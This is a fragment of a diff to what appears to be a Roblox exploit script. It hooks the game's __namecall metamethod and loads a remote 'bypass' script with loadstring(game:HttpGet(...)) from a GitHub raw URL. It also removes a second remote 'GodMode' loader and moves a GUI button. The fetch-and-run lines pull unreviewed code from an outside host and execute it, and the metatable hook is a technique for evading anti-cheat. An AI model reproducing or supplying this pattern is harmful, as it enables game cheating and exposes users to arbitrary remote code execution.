@@ -26,7 +26,7 @@ _100x100.Position = Positions
 
 _100x100.Size = UDim2.new(0, 76, 0, 70)
 
-ImageButton.Parent = _100x100
+ImageButton.Parent = _60x60
 
 ImageButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 
@@ -760,4 +760,3 @@ mt.__namecall = newcclosure(function(remote,...)
 end)
 setreadonly(mt,true)
 loadstring(game:HttpGet('https://raw.githubusercontent.com/finngameandglitch/bypass/main/bypass'))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/CQWEO/GODMODE/main/GodModeByMurder"))()
